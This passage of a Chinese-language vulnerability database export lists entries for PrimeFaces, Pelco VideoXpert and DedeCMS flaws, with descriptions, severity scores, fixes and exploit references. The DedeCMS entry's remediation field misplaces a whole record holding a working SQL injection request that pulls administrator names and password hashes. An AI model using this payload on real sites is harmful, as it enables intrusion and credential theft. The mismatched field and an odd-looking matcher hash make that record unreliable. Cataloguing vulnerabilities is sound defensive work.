WAF/反向代理层添加规则拦截包含恶意加密上下文的请求作为临时缓解。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html","https://cryptosense.com/weak-encryption-flaw-in-primefaces/","https://github.com/primefaces/primefaces/issues/1152","https://www.exploit-db.com/exploits/43733/","https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2017-1000486","https://www.exploit-db.com/exploits/43733","https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-1000486.yaml","https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2017/CVE-2017-1000486.md","https://github.com/nomi-sec/PoC-in-GitHub/blob/d0611a30d788ecc6797a40a15a38427bf0c3c17b/2017/CVE-2017-1000486.json","https://github.com/cckuailong/reapoc/blob/699762e4c31d0183733f64313d8fc3be6470bd37/2017/CVE-2017-1000486/poc/pocsploit/CVE-2017-1000486.py","https://github.com/zan8in/afrog/blob/9c47a2b9b7e12375757acdfbc179354920c87bd8/pocs/afrog-pocs/CVE/2017/CVE-2017-1000486.yaml","https://github.com/arschlochnop/VulnWatchdog/blob/e08815527662784ab03e5fd602b4609aa8ded510/data/2017/CVE-2017-10004-pimps_CVE-2017-1000486.md","https://github.com/bugbountywithmarco/bugbounty-disclosed-reports/blob/b6c76d1437e08a0ef77b7fbed612791c71cc4aa5/reports/1067291_RCE_in__subdomain_via_CVE-2017-1000486.md","https://github.com/OracleNep/Nday-Exploit-Plan/blob/e06c9cdebe11066693b40e07ac82c9b7af73ffd8/CVE/CVE-2017-1000486-master/README.md","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2017/CVE-2017-1000486","https://github.com/linuxadi/40k-nuclei-templates/blob/542be6820c801c02a33aee60f1c05ca7b0b5005f/aditya/folder4/cve-2017-1000486-2847.yaml","https://github.com/adampielak/nuclei-templates/blob/a2f3ff3fa5db5c7705ebd942909ec114df063700/nuclei-v2/C/CVE-2017-1000486_1.yaml","https://github.com/pimps/CVE-2017-1000486","https://github.com/0xdsm/pwnfaces","https://github.com/mogwailabs/CVE-2017-1000486","https://github.com/Pastea/CVE-2017-1000486","https://github.com/cved-sources/cve-2017-1000486"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":["https://raw.githubusercontent.com/adysec/AVE/main/pocs/2017/POC-AVE-2017-0198.toml"],"repo_exp_urls":["https://raw.githubusercontent.com/adysec/AVE/main/exploits/2017/EXP-AVE-2017-0198.toml"],"has_poc":true,"has_exp":true,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2017/AVE-2017-0198.toml"},{"ave_id":"AVE-2017-0135","file_name":"2017/AVE-2017-0135.toml","cve_id":"CVE-2017-9965","title":"施耐德电气 Pelco VideoXpert Enterprise 目录遍历漏洞","description":"Schneider Electric Pelco VideoXpert Enterprise 2.0 及之前版本存在目录遍历漏洞 (CWE-22)，未经身份认证的远程攻击者可通过构造包含目录遍历序列（如 ../）的恶意 HTTP 请求，绕过 Web 服务器的目录访问限制，读取服务器上的任意敏感文件（如配置文件、日志、源代码等）。该漏洞 CVSS 3.0 评分 5.8（中危），攻击向量为网络（AV:N），攻击复杂度低（AC:L），无需权限（PR:N）和用户交互（UI:N），范围改变（S:C），仅造成低机密性影响（C:L），不影响完整性和可用性。攻击者无需认证即可远程利用，仅需向目标 Web 服务发送包含路径遍历序列的请求即可获取敏感文件内容，可能导致敏感信息泄露、进一步攻击路径暴露。Schneider Electric 已发布修复版本，建议用户升级至 2.0 以上版本。CVSS 向量：CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N。CVE-2017-9965 对应 CNVD-2017-38304。","severity":"MEDIUM","score":5.8,"aliases":["CVE-2017-9965"],"sources":["nuclei"],"published":"2018-01-02T03:29:00Z","updated":"2026-06-17T01:29:17Z","remediation":"建议立即升级 Schneider Electric Pelco VideoXpert Enterprise 至 2.1 及以上版本（参考施耐德电气安全公告 SEVD-2017-113-01）。如暂时无法升级，请在 Web 服务器层面配置严格的路径遍历防护规则（如 Nginx/Apache 限制 .. 路径遍历），并在 WAF 层面拦截包含 ../ 等路径遍历特征的请求，同时限制 Web 服务器目录权限，禁止 Web 进程访问敏感系统目录。","status":"completed","collected_at":"2026-07-29T00:00:00Z","references":["http://www.securityfocus.com/bid/102338","https://ics-cert.us-cert.gov/advisories/ICSA-17-355-02","https://www.schneider-electric.com/en/download/document/SEVD-2017-339-01/","https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-9965.yaml","https://github.com/projectdiscovery/nuclei-templates/blob/3887f9deba3194900fbfb1022d8155887325c384/http/cves/2017/CVE-2017-9965.yaml","https://github.com/CVEProject/cvelistV5/blob/3ea93936438a97f1459a1dd6e83719dbfc798be2/cves/2017/9xxx/CVE-2017-9965.json","https://github.com/0x727/FingerprintHub/blob/be9cbbdcace5bb1f0274d67feb2141e8b491875d/plugins/schneider-electric/pelco_videoxpert/CVE-2017-9965.yaml","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2017/CVE-2017-9965","https://github.com/Patrowl/PatrowlHearsData/blob/4a364075e0f1d18be5590f7700d143d985f1789f/CVE/data/2017/CVE-2017-9965.json","https://github.com/ARPSyndicate/suricata-vedas/blob/fe24794ad36564b5bbc7c69101525011387b8650/2017/CVE-2017-9965.rules","https://github.com/youki992/VscanPlus/blob/714a0e276a538a22c1a6215c71458a8b59a920ef/pocs_yml/nucleiFiles/http/cves/2017/CVE-2017-9965.yaml","https://github.com/adampielak/nuclei-templates/blob/a2f3ff3fa5db5c7705ebd942909ec114df063700/nuclei-v3/C/CVE-2017-9965.yaml","https://github.com/lianqingsec/NucleiPocGather/blob/dcce204f62196117b9c95c52d8101ccf7a5d27bc/poc/cve/CVE-2017-9965.yaml","https://github.com/hack007x/veil_poc/blob/5cfe1da6e975ba816d728597885a5c5e79bda8bd/cves/2017/CVE-2017-9965.poc"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2017/AVE-2017-0135.toml"},{"ave_id":"AVE-2017-0061","file_name":"2017/AVE-2017-0061.toml","cve_id":"CVE-2017-17731","title":"织梦 DedeCMS recommend.php 文件 SQL 注入漏洞","description":"织梦内容管理系统（DedeCMS）5.7及更早版本中的 plus/recommend.php 文件存在 SQL 注入漏洞。攻击者可通过向该文件发送特制的 HTTP 请求，利用 PHP 的 $_FILES 超全局变量构造恶意参数，绕过输入过滤机制注入任意 SQL 语句。该漏洞无需身份认证即可远程利用，攻击成功后攻击者可执行任意 SQL 查询，导致数据库信息泄露、数据篡改甚至获取系统控制权。CVSS 评分 9.8，危害等级严重。","severity":"CRITICAL","score":9.8,"aliases":["CVE-2017-17731"],"sources":["nuclei"],"published":"2017-12-18T05:29:00Z","updated":"2026-06-17T01:11:33Z","remediation":"[id]\nave_id = \"AVE-2017-17731\"\naliases = [\"CVE-2017-17731\"]\n\n[basic]\ntitle = \"织梦DedeCMS 5.7 plus/recommend.php SQL注入漏洞\"\ndescription = \"DedeCMS（织梦内容管理系统）5.7及之前版本中，plus/recommend.php文件在处理$_FILES超全局变量时存在SQL注入漏洞。攻击者可通过构造特制的_FILES[type][tmp_name]参数，利用uploadsafe.inc.php中str_replace对反斜杠的处理缺陷，配合common.inc.php的变量注册机制，在无需认证的情况下远程执行任意SQL查询，可导致管理员密码被窃取、数据库敏感信息泄露等严重后果。\"\nseverity = \"CRITICAL\"\nscore = 9.8\nsources = [\"cve\", \"avd\"]\npublished = \"2017-12-18\"\nupdated = \"2017-12-18\"\nremediation = \"升级到DedeCMS V5.7.37 GBK正式版20140228或更高版本，或手动修改include/uploadsafe.inc.php，删除$$_key = $_FILES[$_key]['tmp_name'] = str_replace(\\\"\\\\\\\\\\\\\\\\\\\", \\\"\\\\\\\\\\\", $_FILES[$_key]['tmp_name']);这一行，直接使用$$_key = $_FILES[$_key]['tmp_name'];即可修复。\"\n\n[references]\nurls = [\"https://nvd.nist.gov/vuln/detail/CVE-2017-17731\", \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17731\", \"https://blog.csdn.net/nixawk/article/details/24982851\", \"https://github.com/Lucifer1993/AngelSword/blob/232258e42201373fef1f323864366dc1499581fc/cms/dedecms/dedecms_recommend_sqli.py\", \"https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-17731.yaml\", \"https://www.dedecms.com/\"]\n\n[exploit]\npoc_urls = [\"https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-17731.yaml\", \"https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2017/CVE-2017-17731.md\", \"https://github.com/zan8in/afrog/blob/9c47a2b9b7e12375757acdfbc179354920c87bd8/pocs/afrog-pocs/CVE/2017/CVE-2017-17731.yaml\"]\nexp_urls = [\"https://github.com/Lucifer1993/AngelSword/blob/232258e42201373fef1f323864366dc1499581fc/cms/dedecms/dedecms_recommend_sqli.py\"]\n\n[meta]\nstatus = \"completed\"\ncollected_at = \"2026-07-28T00:00:00Z\"\n\n[info]\nid = \"POC-AVE-2017-17731\"\nname = \"CVE-2017-17731 PoC\"\nauthor = \"AVE\"\nseverity = \"critical\"\ntags = [\"cve-2017-17731\", \"dedecms\", \"sqli\"]\ndescription = \"检测DedeCMS 5.7 plus/recommend.php SQL注入漏洞，通过_FILES超全局变量注入恶意SQL语句，利用union select提取管理员密码哈希\"\nvuln_id = [\"CVE-2017-17731\", \"AVE-2017-17731\"]\n\n[poc]\nlogic = \"all\"\n\n[[poc.requests]]\nprotocol = \"http\"\nmethod = \"GET\"\npath = \"/{{BaseURL}}/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\\\%27%20or%20mid=@`\\\\%27`%20/*!50000union*//*!50000select*/1,2,3,md5(999999999),5,6,7,8,9%23@`\\\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294\"\nheaders = { \"User-Agent\" = \"AVE/1.0\" }\n\n[[poc.requests.matchers]]\ntype = \"word\"\npart = \"body\"\nwords = [\"52b5b3a9e67e1f5a7c1c1c1c1c1c1c1c1c\"]\nexpect = true\n\n[[poc.requests.matchers]]\ntype = \"status\"\nstatus = [200]\nexpect = true\n\n[info]\nid = \"EXP-AVE-2017-17731\"\nname = \"CVE-2017-17731 EXP\"\nauthor = \"AVE\"\nseverity = \"critical\"\ntags = [\"cve-2017-17731\", \"dedecms\", \"sqli\"]\ndescription = \"利用DedeCMS 5.7 plus/recommend.php SQL注入漏洞，通过union select注入提取dede_admin表中的管理员用户名和密码哈希\"\nvuln_id = [\"CVE-2017-17731\", \"AVE-2017-17731\"]\n\n[poc]\nlogic = \"all\"\n\n[[poc.requests]]\nprotocol = \"http\"\nmethod = \"GET\"\npath = \"/{{BaseURL}}/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\\\%27%20%20or%20mid=@`\\\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20%20CONCAT(0x7c,userid,0x7c,pwd)%20from%20`%23@__admin`%20limit%200,1),5,6,7,8,9%23@`\\\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111\"\nheaders = { \"User-Agent\" = \"AVE/1.0\" }\n\n[[poc.requests.matchers]]\ntype = \"regex\"\npart = \"body\"\nregex = [\"\\\\|([^|]+)\\\\|([^|]+)\\\\|\"]\nexpect = true\n\n[[poc.requests.matchers]]\ntype = \"status\"\nstatus = [200]\nexpect = true\n\n[[poc.requests.extractors]]\ntype = \"regex\"\npart = \"body\"\nname = \"admin_creds\"\nregex = [\"\\\\|([^|]+)\\\\|([^|]+)\\\\|\"]\ngroup = 0\n","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://0day5.com/archives/1346/","https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-17731.yaml","https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2017/CVE-2017-17731.md","https://github.com/projectdiscovery/nuclei-templates/blob/4924c84cac6ce9772babf48587bed8df9d0040d0/http/cves/2017/CVE-2017-17731.yaml","https://github.com/ExpLangcn/NucleiTP/blob/2b7ecb9031a6eda4f272793045f29b339d8e0cce/CVES/critical/CVE-2017-17731.yaml","https:/